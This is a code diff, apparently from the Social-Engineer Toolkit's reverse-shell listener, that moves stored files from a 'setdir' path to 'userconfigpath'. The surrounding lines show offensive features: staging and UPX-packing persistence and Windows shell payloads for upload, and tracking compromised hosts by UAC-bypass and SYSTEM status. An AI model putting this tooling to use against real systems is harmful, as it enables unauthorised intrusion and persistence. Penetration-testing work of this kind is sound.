@@ -17,10 +17,10 @@ definepath = os.getcwd()
 sys.path.append(definepath)
 
 # cleanup
-if os.path.isfile(setdir + "/uac.address"):
-    os.remove(setdir + "/uac.address")
-if os.path.isfile(setdir + "/system.address"):
-    os.remove(setdir + "/system.address")
+if os.path.isfile(userconfigpath + "uac.address"):
+    os.remove(userconfigpath + "uac.address")
+if os.path.isfile(userconfigpath + "system.address"):
+    os.remove(userconfigpath + "system.address")
 
 # will remove this later
 core_modules = True
@@ -863,9 +863,9 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                     time.sleep(0.5)
 
                     # write out system
-                    if os.path.isfile("%s/system.address" % (setdir)):
-                        os.remove("%s/system.address" % (setdir))
-                    filewrite = open("%s/system.address" % (setdir), "w")
+                    if os.path.isfile("%s/system.address" % (userconfigpath)):
+                        os.remove("%s/system.address" % (userconfigpath))
+                    filewrite = open("%s/system.address" % (userconfigpath), "w")
                     filewrite.write(addr)
                     filewrite.close()
 
@@ -882,9 +882,9 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                     # had to do some funky stuff here because global vars are not working properly
                     # inside threads, so the information cant be passed to
                     # normal outside routines
-                    if os.path.isfile(setdir + "/uac.address"):
-                        os.remove(setdir + "/uac.address")
-                    filewrite = open(setdir + "/uac.address", "w")
+                    if os.path.isfile(userconfigpath + "uac.address"):
+                        os.remove(userconfigpath + "uac.address")
+                    filewrite = open(userconfigpath + "uac.address", "w")
                     filewrite.write(addr)
                     filewrite.close()
 
@@ -1033,9 +1033,9 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                         if os.path.isfile("src/payloads/set_payloads/persistence.binary"):
                             if core_modules == True:
                                 subprocess.Popen(
-                                    "cp src/payloads/set_payloads/persistence.binary %s" % (setdir), shell=True).wait()
-                                upx("%s/persistence.binary" % (setdir))
-                                upload = "%s/persistence.binary" % (setdir)
+                                    "cp src/payloads/set_payloads/persistence.binary %s" % (userconfigpath), shell=True).wait()
+                                upx("%s/persistence.binary" % (userconfigpath))
+                                upload = "%s/persistence.binary" % (userconfigpath)
                             if core_modules == False:
                                 upload = "src/payloads/set_payloads/persistence.binary"
 
@@ -1085,9 +1085,9 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                         if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                             if core_modules == True:
                                 subprocess.Popen(
-                                    "cp src/payloads/set_payloads/shell.windows %s" % (setdir), shell=True).wait()
-                                upx(setdir + "/shell.windows")
-                                upload = setdir + "/shell.windows"
+                                    "cp src/payloads/set_payloads/shell.windows %s" % (userconfigpath), shell=True).wait()
+                                upx(userconfigpath + "shell.windows")
+                                upload = userconfigpath + "shell.windows"
                             if core_modules == False:
                                 upload = "src/payloads/set_payloads/shell.windows"
 
@@ -1437,8 +1437,8 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                 # if we have a windows shell
                 if data == "IHAYYYYYIAMSETANDIAMWINDOWS":
 
-                    if os.path.isfile(setdir + "/system.address"):
-                        fileopen = open(setdir + "/system.address", "r")
+                    if os.path.isfile(userconfigpath + "system.address"):
+                        fileopen = open(userconfigpath + "system.address", "r")
                         system = fileopen.read().rstrip()
                         system = system.replace(":WINDOWS", "")
                         system = system.replace(":UAC-SAFE", "")
@@ -1446,8 +1446,8 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                             temp_addr = str(addr[0] + ":WINDOWS:SYSTEM")
                             bypass_counter = 1
 
-                    if os.path.isfile(setdir + "/uac.address"):
-                        fileopen = open(setdir + "/uac.address", "r")
+                    if os.path.isfile(userconfigpath + "uac.address"):
+                        fileopen = open(userconfigpath + "uac.address", "r")
                         uac = fileopen.read().rstrip()
                         uac = uac.replace(":WINDOWS", "")
                         if str(addr[0]) == str(uac):
@@ -1479,12 +1479,12 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
 
             # reset value
             # if uac != None:
-            if os.path.isfile(setdir + "/uac.address"):
-                os.remove(setdir + "/uac.address")
+            if os.path.isfile(userconfigpath + "uac.address"):
+                os.remove(userconfigpath + "uac.address")
                 bypass_counter = 0
 
-            if os.path.isfile(setdir + "/system.address"):
-                os.remove(setdir + "/system.address")
+            if os.path.isfile(userconfigpath + "system.address"):
+                os.remove(userconfigpath + "system.address")
                 bypass_counter = 0
 
             if addr[0] != "127.0.0.1":
